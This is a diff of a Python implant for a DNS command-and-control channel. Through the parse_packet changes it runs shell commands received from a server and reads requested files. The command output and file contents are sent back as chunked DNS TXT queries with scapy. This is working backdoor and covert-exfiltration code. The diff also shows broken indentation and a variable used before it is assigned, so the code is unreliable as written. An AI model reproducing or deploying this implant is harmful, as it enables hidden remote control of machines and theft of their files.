@@ -1,7 +1,32 @@
-
 from dns_c2_modules import *
 
 cond = 0
+
+def RunCommand(cmd):
+    return subprocess.getoutput(cmd)
+    
+def signal_handler(sig, frame):
+    print(' Exiting...')
+    sys.exit(0)
+    
+def read_file(file_name):
+    with open(file_name, "rb") as f:
+        return f.read()
+
+def send_qery(dest_adr,data,is_output): 
+    for chunk in range(0, len(data), MTU_SIZE - HEADER_SIZE):
+        x = chunk
+        if is_output == 1:                          # if in_transfer flag is required
+            content = IN_TRANSFER
+            content+=data[x:x+1400]
+            pkt = IP(dst=dest_adr)/UDP(sport="1234")/DNS(qd=DNSQR(qtype="TXT", qname=content))
+        else:
+            pkt = IP(dst=dest_adr)/UDP()/DNS(qd=DNSQR(qtype="TXT", qname=data))
+        send(pkt)
+        time.sleep(100/1000)
+
+def bin_to_str(bin_data):
+    return bin_data.decode('utf-8')
 
 def read_file(file_name):
     with open(file_name, "rb") as f:
@@ -13,7 +38,7 @@ def send_beacon(addr,data):
         # pkt_send(pkt_no_data,data,0)
         #pkt_no_data = IP(dst=addr)/UDP()/DNS(qd=DNSQR(qtype="TXT", qname=base64.b64encode(data)))
         
-        send_qery(addr,base64.b64encode(data).decode('ascii'),0)
+        send_qery(addr,data,0)
         print("send beacon")
         time.sleep(5)
     
@@ -28,36 +53,34 @@ def parse_packet(packet):
         get_an =  packet[1][DNSRR].rdata
         print("answer:")
         print(get_an)
-        #prefix_packet = check_prefix(get_an)
-        data_decoded = base64.b64decode(get_an[0]).decode('ascii') 
-        print("data decoded!")
-        print(data_decoded)
-        print(type(data_decoded))    
-        #prefix_packet = check_prefix(base64.b64decode(get_an[0]).decode('ascii'))
-        prefix_packet = check_prefix(data_decoded)
+  
+	 if get_an.startswith(RUN):
+         	prefix_packet = RUN
+         	
+         elif get_an.startswith(FILE):
+         	prefix_packet = FILE
 
         print("prefix:")
         print(prefix_packet)
-        data_recieved = extract_data(get_an[0],prefix_packet)
         print("data receieved:")
         print(data_recieved)
-        #pkt_no_data = IP(dst=SERVER_ADR)/ICMP(type="echo-request")
         
         if prefix_packet == RUN or prefix_packet == FILE:
             print("recieved response!")
-            #txt_recieved = bin_to_str(data_recieved)     # the plaintxt of the command
+            data_recieved = get_an[len(prefix_packet)]
+            txt_recieved = bin_to_str(data_recieved)     # the plaintxt of the command
             if prefix_packet == RUN:
-                print("command is: "+data_recieved)
-                output = RunCommand(data_recieved)
+                print("command is: "+txt_recieved)
+                output = RunCommand(txt_recieved)
                 bin_output = bytes(output.encode())
-                send_qery(SERVER_ADR,base64.b64encode(BEGIN_OUTPUT)+data_recieved,0)
-                send_qery(SERVER_ADR,base64.b64encode(bin_output),1)
+                send_qery(SERVER_ADR,BEGIN_OUTPUT+data_recieved,0)
+                send_qery(SERVER_ADR,bin_output,1)
             else:
                 print("file is: "+data_recieved)
                 output = read_file(txt_recieved)   # read in binary mode
-                send_qery(SERVER_ADR,base64.b64encode(BEGIN_FILE)+data_recieved,0)
-                send_qery(SERVER_ADR,base64.b64encode(output),1)
-            send_qery(SERVER_ADR,base64.b64encode(EF),0)
+                send_qery(SERVER_ADR,BEGIN_FILE +data_recieved,0)
+                send_qery(SERVER_ADR,output,1)
+            send_qery(SERVER_ADR,EF,0)
                 
         cond = 0
         print("cond changed to " + str(cond))
